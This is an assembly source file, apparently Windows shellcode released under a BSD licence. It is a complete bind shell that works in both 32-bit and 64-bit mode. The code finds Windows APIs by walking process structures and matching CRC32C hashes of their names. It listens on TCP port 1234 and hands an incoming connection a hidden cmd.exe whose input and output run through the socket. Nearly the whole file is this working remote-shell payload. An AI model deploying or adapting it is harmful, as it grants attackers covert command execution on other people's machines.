;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;    

    bits   32

%macro callx 3
  %assign %%h 0  
  %strlen %%len %1
  %assign %%s 1
  
  ; first the dll
  %rep %%len
    %substr %%c %1 %%s
    %assign %%c (%%c | 0x20)
    %assign %%b (%%c ^ (%%h & 0xFF))
    %assign %%h (%%h >> 8)    
    %rep 8
      %assign %%b (%%b >> 1) ^ ((0x82F63B78 * (%%b & 1)) & 0xFFFFFFFF)  
    %endrep
    %assign %%h (%%h ^ %%b)
    %assign %%s (%%s + 1)
  %endrep
  
  %assign %%dll_h %%h

  %assign %%h 0
  %strlen %%len %2
  %assign %%s 1
  
  ; then the api
  %rep %%len
    %substr %%c %2 %%s
    %assign %%c (%%c | 0x20)
    %assign %%b (%%c ^ (%%h & 0xFF))
    %assign %%h (%%h >> 8)    
    %rep 8
      %assign %%b (%%b >> 1) ^ ((0x82F63B78 * (%%b & 1)) & 0xFFFFFFFF) 
    %endrep
    %assign %%h (%%h ^ %%b)
    %assign %%s (%%s + 1)
  %endrep
  
  mov  cl, %3 
  db   0b8h
  dd   (%%dll_h + %%h) & 0xFFFFFFFF
  call ebp
%endmacro

    ;int3
    push   ebx
    push   ebp
    push   edi
    push   esi    
    jmp    rc_l0
rc_l1:
    pop    esi
    xor    ecx, ecx
    mov    cl, (get_api - crc32cx)
    dec    eax
    lea    ebp, [esi+ecx]
    
    mov    cl, (rc_l2 - crc32cx) & 0xFF
    mov    ch, (rc_l2 - crc32cx) >> 8
    dec    eax
    lea    edx, [esi+ecx]

    call   edx
    pop    esi
    pop    edi
    pop    ebp
    pop    ebx
    ret
rc_l0:
    call   rc_l1 
; in:  esi = s
; out: eax = crc32c(s)
;   
crc32cx:
    push   ecx 
    push   edx 
      
    xor    eax, eax          ; eax = 0
    cdq                      ; edx = 0
crc_l0x:
    lodsb                    ; al = *s++ | 0x20
    test   al, al
    jz     crc_l3x
    
    or     al, 0x20
    xor    dl, al            ; crc ^= c
    push   8
    pop    ecx    
crc_l1x:
    shr    edx, 1            ; crc >>= 1
    jnc    crc_l2x
    xor    edx, 0x82F63B78
crc_l2x:
    loop   crc_l1x
    jmp    crc_l0x
crc_l3x:    
    xchg   eax, edx
    
    pop    edx
    pop    ecx
    ret

; in:  ebp = base of module to search
;      esi = hash to find
;
; out: ecx = api address resolved in EAT
;
search_expxx:
    push   edi
    push   ebx
    push   edx
    push   esi
    
    ; edx += IMAGE_DOS_HEADER.e_lfanew
    add    edx, [ebp+3ch]
    
    ; ecx = VirtualAddress
    mov    ecx, [ebp+edx+28h]
    jecxz  exp_l2x
    
    ; save hash to find
    push   esi
    
    ; esi = Name
    mov    esi, [ebp+ecx+0ch]
    dec    eax
    add    esi, ebp
    call   crc32cx
    xchg   eax, edi

    ; edx = AddressOfFunctions
    mov    esi, [ebp+ecx+1ch]
    dec    eax
    add    esi, ebp
    ; esi = AddressOfNames      
    mov    edx, [ebp+ecx+20h]
    dec    eax
    add    edx, ebp    
    ; ebx = AddressOfNameOrdinals
    mov    ebx, [ebp+ecx+24h]
    dec    eax
    add    ebx, ebp    
    ; ecx = NumberOfNames
    mov    ecx, [ebp+ecx+18h]
    ; pop hash to find
    pop    eax
    jecxz  exp_l2x
    
    push   ebx    ; save AddressOfNameOrdinals
    push   esi    ; save AddressOfFunctions
    xchg   eax, ebx
exp_l1x:
    mov    esi, [edx+4*ecx-4]
    ; esi = RVA2VA(esi, ebp)   
    dec    eax
    add    esi, ebp
    ; add hash of dll string
    call   crc32cx
    add    eax, edi
    ; found match?
    cmp    eax, ebx
    loopne exp_l1x
    
    pop    esi
    pop    ebx
    jne    exp_l2x
    
    ; get ordinal
    movzx  ebx, word [ebx+2*ecx]
    ; get rva
    mov    ecx, [esi+4*ebx]
    dec    eax
    add    ecx, ebp
exp_l2x:
    pop    esi
    pop    edx
    pop    ebx
    pop    edi
    ret
    
; LPVOID get_api(DWORD hash);
;
; expects dll+api hash in eax
; argument count in cl
get_api:
    movzx  ecx, cl
    push   ecx
    
    push   ebx
    push   edi
    push   esi
    push   ebp
    
    xchg   eax, esi
    
    xor    ebx, ebx
    mul    ebx
    mov    bl, 30h
    dec    eax
    jns    gapi_l0x

    db     64h              ; fs:
    mov    edi, [ebx]
    mov    edi, [edi+12]
    mov    edi, [edi+12]
    mov    bl, 18h
    mov    dl, 50h
    jmp    gapi_l2x
gapi_l0x:
    mov    dl, 60h
    db     65h              ; gs:
    dec    eax
    mov    edi, [edx]
    dec    eax
    mov    edi, [edi+24]
    dec    eax
    mov    edi, [edi+16]
    jmp    gapi_l2x

gapi_l1x:
    call   search_expxx 
    
    dec    eax
    test   ecx, ecx
    jnz    gapi_l3x
    
    dec    eax
    mov    edi, [edi]     ; dte->InMemoryOrderLinks.Flink
gapi_l2x:
    dec    eax
    mov    ebp, [edi+ebx] ; dte->DllBase
    
    dec    eax
    test   ebp, ebp
    jnz    gapi_l1x
    push   ebp
    pop    ecx
gapi_l3x:
    pop    ebp
    pop    esi
    pop    edi
    pop    ebx
    ; pop arg count for x64
    pop    edx
    xor    eax, eax
    dec    eax
    jns    gapi_l5x
    push   ecx
    ret
    
    bits   64
gapi_l5x:
    mov    r12d, edx
    mov    r11, rcx
    
    ; pop return address
    pop    r15
    
    ;no arg?
    test   r12d, r12d
    jz     gapi_l6x
    
    sub    r12d, 1
    pop    rcx
    ; 1 arg?
    jz     gapi_l6x

    sub    r12d, 1    
    pop    rdx
    ; 2 arg?
    jz     gapi_l6x

    sub    r12d, 1    
    pop    r8
    ; 3 arg
    jz     gapi_l6x
    ; 4 or more
    pop    r9
    sub    r12d, 1      
gapi_l6x:
    ; create homespace for rcx,rdx,r8 and r9
    sub    rsp, 20h
    call   r11
    ; release homespace and remove arguments
    lea    rsp, [rsp+8*r12+20h]
    push   r15
    ret
    
    bits   32    

rc_l2:    
    xor    edx, edx
    mov    dh, 2
    dec    eax    
    sub    esp, edx 
    push   esp
    pop    edi
    
    ; LoadLibraryA ("ws2_32");
    push   edi
    mov    eax, 'ws2_'
    stosd
    mov    eax, ~'32'
    not    eax
    stosd
    callx  "kernel32.dll", "LoadLibraryA", 1
    
    ; WSAStartup (MAKEWORD(2,0), &wsa);
    push   edi         ; &wsa
    push   2           ; MAKEWORD(2, 0)
    callx  "ws2_32.dll", "WSAStartup", 2
    
    ; WSASocket (AF_INET, SOCK_STREAM, IPPROTO_IP, NULL, 0, 0);
    push   eax         ; 0
    push   eax         ; 0
    push   eax         ; NULL
    push   eax         ; IPPROTO_IP
    push   1           ; SOCK_STREAM
    push   2           ; AF_INET 
    callx  "ws2_32.dll", "WSASocketA", 6
    
    xchg   eax, ebx    ; ebx = s

    ; bind (s, (struct sockaddr*)&sa, sizeof(sa));
    push   16          ; sizeof(sa)
    push   edi         ; &sa
    mov    eax, ~0xD2040002 & 0xFFFFFFFF  ; 1234, AF_INET 
    not    eax
    stosd    
    mov    eax, ~0x00000000 & 0xFFFFFFFF  ; 
    not    eax
    stosd    
    xor    eax, eax
    stosd
    stosd    
    push   ebx         ; s
    callx  "ws2_32.dll", "bind", 3    
    test   eax, eax
    jnz    cls_s
    
    ; listen (s, 0);
    push   eax
    push   ebx
    callx  "ws2_32.dll", "listen", 2    
    test   eax, eax
    jnz    cls_s
        
    ; accept (s, 0, 0);
    push   eax
    push   eax
    push   ebx
    callx  "ws2_32.dll", "accept", 3
    test   eax, eax
    js     cls_s
    
    xchg   eax, esi
    jmp    init_si
cls_r:
    ; closesocket (r);
    push   esi 
    callx  "ws2_32.dll", "closesocket", 1           
cls_s:
    push   ebx
    ; closesocket (s);
    callx  "ws2_32.dll", "closesocket", 1     
exit_code:
    xor    edx, edx
    mov    dh, 2  
    dec    eax    
    add    esp, edx
    ret    
init_si:    
    ; initialize STARTUPINFO
    ; here is where it gets a bit tricky
    push   104
    pop    eax
    push   edi
    stosd
    ; si.cb = sizeof(STARTUPINFO)
    ; memset(&si.lpReserved, 0, sizeof(si) - sizeof(DWORD))
    xchg   eax, ecx
    xor    eax, eax
    rep    stosb
    pop    edi

    push   edi
    
    dec    eax
    js     rc_l9x
    mov    cl, 24
rc_l9x:    
    dec    eax
    lea    edi, [edi+ecx+56] ; 56 for 32, 80 for x64

    mov    cl, 3
rc_l6x:    
    mov    [edi], esi  ; si.hStdInput  = s
    dec    eax         ; advance 4 or 8 depending on mode
    scasd
    loop   rc_l6x
    
    xor    eax, eax
    dec    eax
    js     rc_l10x
    mov    cl, 16
    
rc_l10x:    
    pop    edx

    ; CreateProcess (NULL, "cmd", NULL, NULL, 
    ;     TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    inc    dword[edx+ecx+45]
    ;mov    dword[edx+44], 100h ;STARTF_USESTDHANDLES
    mov    eax, ~'cmd'
    not    eax
    push   edi
    stosd 
    pop    eax
    push   edi         ; &pi         
    push   edx         ; &si   
    xor    ecx, ecx    ; ecx = NULL

    push   8
    pop    edx
    shl    edx, 24     ; edx = 0x08000000
    
    push   ecx         ; NULL
    push   ecx         ; NULL
    push   edx         ; CREATE_NO_WINDOW
    push   1           ; TRUE, has to be 1 for NT
    push   ecx         ; NULL
    push   ecx         ; NULL    
    push   eax         ; "cmd", 0
    push   ecx         ; NULL
    callx  "kernel32.dll", "CreateProcessA", 10
    neg    eax
    jns    cls_r
    
    ; WaitForSingleObject (pi.hProcess, INFINITE);
    push   eax         ; INFINITE
    mov    eax, [edi]
    push   eax         ; pi.hProcess
    callx  "kernel32.dll", "WaitForSingleObject", 2 
    
    push   dword[edi]
    callx  "kernel32.dll", "CloseHandle", 1
    
    dec    eax
    scasd
    push   dword[edi]  
    callx  "kernel32.dll", "CloseHandle", 1    
    jmp    cls_r
